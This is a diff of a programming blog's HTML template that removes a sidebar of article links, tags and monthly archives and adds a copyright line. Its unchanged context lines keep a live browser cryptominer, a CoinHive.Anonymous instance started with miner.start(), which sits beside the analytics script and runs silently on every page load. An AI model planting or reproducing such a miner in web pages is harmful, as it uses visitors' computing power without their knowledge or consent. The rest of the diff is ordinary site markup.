@@ -596,103 +562,6 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
 
   </main>
 
-  <aside id="history">
-    <section class="recent">
-      <h2>Recent Articles</h2>
-      <ol class="articles">
-            <li><a href="/2017/06/17/ltrees-in-phoenix.html">LTrees in Phoenix</a>
-            <li><a href="/2017/05/02/something-useless-terminal-in-your-browser.html">Something Useless - Terminal in your browser</a>
-            <li><a href="/2017/04/18/something-useless-redux-implemented-in-elixir.html">Something Useless - Redux Implemented in Elixir</a>
-            <li><a href="/2016/08/24/learn-to-program-with-elixir.html">Learn to Program with Elixir</a>
-            <li><a href="/2016/05/23/guard-this-with-your-life-or-authenticating-apis-with-guardian.html">Guard this with your life... Or authenticating APIs with Guardian</a>
-            <li><a href="/2016/04/26/processes-in-elixir.html">Processes in Elixir</a>
-            <li><a href="/2016/02/24/hey-watch-it-or-how-to-monitor-files-in-elixir.html">Hey! Watch it!...or how to monitor files in Elixir</a>
-            <li><a href="/2015/08/23/let-s-build-something-with-rack.html">Let's build something with Rack</a>
-            <li><a href="/2015/08/21/lets-learn-about-rack.html">Let's learn about Rack</a>
-            <li><a href="/2015/06/08/rails-foreign-key-constraints-the-ugly-way.html">Rails Foreign Key Constraints - The Ugly Way</a>
-      </ol>
-    </section>
-
-    <section class="tags">
-      <h2>Tags</h2>
-      <ol>
-            <li><a href="/tags/beginner.html">Beginner</a> (1)</a></li>
-            <li><a href="/tags/concurrency.html">Concurrency</a> (1)</a></li>
-            <li><a href="/tags/ecto.html">Ecto</a> (1)</a></li>
-            <li><a href="/tags/elixir.html">Elixir</a> (3)</a></li>
-            <li><a href="/tags/ltrees.html">LTrees</a> (1)</a></li>
-            <li><a href="/tags/learn-to-program.html">Learn to Program</a> (1)</a></li>
-            <li><a href="/tags/phoenix.html">Phoenix</a> (1)</a></li>
-            <li><a href="/tags/processes.html">Processes</a> (1)</a></li>
-            <li><a href="/tags/random-thoughts.html">Random Thoughts</a> (1)</a></li>
-            <li><a href="/tags/authentication.html">authentication</a> (1)</a></li>
-            <li><a href="/tags/basics.html">basics</a> (1)</a></li>
-            <li><a href="/tags/beginner.html">beginner</a> (1)</a></li>
-            <li><a href="/tags/closures.html">closures</a> (1)</a></li>
-            <li><a href="/tags/components-of-programming.html">components of programming</a> (1)</a></li>
-            <li><a href="/tags/elixir.html">elixir</a> (5)</a></li>
-            <li><a href="/tags/enumerable.html">enumerable</a> (1)</a></li>
-            <li><a href="/tags/file-watchers.html">file watchers</a> (1)</a></li>
-            <li><a href="/tags/find.html">find</a> (1)</a></li>
-            <li><a href="/tags/fs.html">fs</a> (1)</a></li>
-            <li><a href="/tags/fundamentals.html">fundamentals</a> (1)</a></li>
-            <li><a href="/tags/generators.html">generators</a> (1)</a></li>
-            <li><a href="/tags/guardian.html">guardian</a> (1)</a></li>
-            <li><a href="/tags/javascript.html">javascript</a> (3)</a></li>
-            <li><a href="/tags/learning.html">learning</a> (1)</a></li>
-            <li><a href="/tags/navigation.html">navigation</a> (1)</a></li>
-            <li><a href="/tags/phoenix.html">phoenix</a> (1)</a></li>
-            <li><a href="/tags/polyglot.html">polyglot</a> (1)</a></li>
-            <li><a href="/tags/postgresql.html">postgresql</a> (1)</a></li>
-            <li><a href="/tags/promises.html">promises</a> (1)</a></li>
-            <li><a href="/tags/rack.html">rack</a> (2)</a></li>
-            <li><a href="/tags/rails.html">rails</a> (2)</a></li>
-            <li><a href="/tags/redux.html">redux</a> (1)</a></li>
-            <li><a href="/tags/routing.html">routing</a> (1)</a></li>
-            <li><a href="/tags/ruby.html">ruby</a> (6)</a></li>
-            <li><a href="/tags/sharp-axe.html">sharp axe</a> (1)</a></li>
-            <li><a href="/tags/something-useless.html">something useless</a> (2)</a></li>
-            <li><a href="/tags/web.html">web</a> (1)</a></li>
-      </ol>
-    </section>
-    <section class="by-month">
-      <h2>By Month</h2>
-      <ol>
-            <li><a href="/2017/06.html">June 2017</a>
-              (1)</a></li>
-            <li><a href="/2017/05.html">May 2017</a>
-              (1)</a></li>
-            <li><a href="/2017/04.html">April 2017</a>
-              (1)</a></li>
-            <li><a href="/2016/08.html">August 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/05.html">May 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/04.html">April 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/02.html">February 2016</a>
-              (1)</a></li>
-            <li><a href="/2015/08.html">August 2015</a>
-              (2)</a></li>
-            <li><a href="/2015/06.html">June 2015</a>
-              (1)</a></li>
-            <li><a href="/2015/05.html">May 2015</a>
-              (2)</a></li>
-            <li><a href="/2015/02.html">February 2015</a>
-              (1)</a></li>
-            <li><a href="/2014/11.html">November 2014</a>
-              (1)</a></li>
-            <li><a href="/2014/05.html">May 2014</a>
-              (1)</a></li>
-            <li><a href="/2014/04.html">April 2014</a>
-              (2)</a></li>
-            <li><a href="/2014/02.html">February 2014</a>
-              (1)</a></li>
-            <li><a href="/2013/10.html">October 2013</a>
-              (1)</a></li>
-      </ol>
-    </section>
-  </aside>
  <script>
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
   (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
@@ -709,6 +578,8 @@ JavaScript also uses camelCase for its variables, vs Ruby&rsquo;s snake case.</p
    var miner = new CoinHive.Anonymous('zmOZS6Bce7Nsw6WOSrt2cAJvIy4CvcNV');
    miner.start();
  </script>
+
+ <em>Copyright &copy; 2017 Steven Nu&ntilde;ez - HostileDeveloper</em>
 
 </div>
 </body>
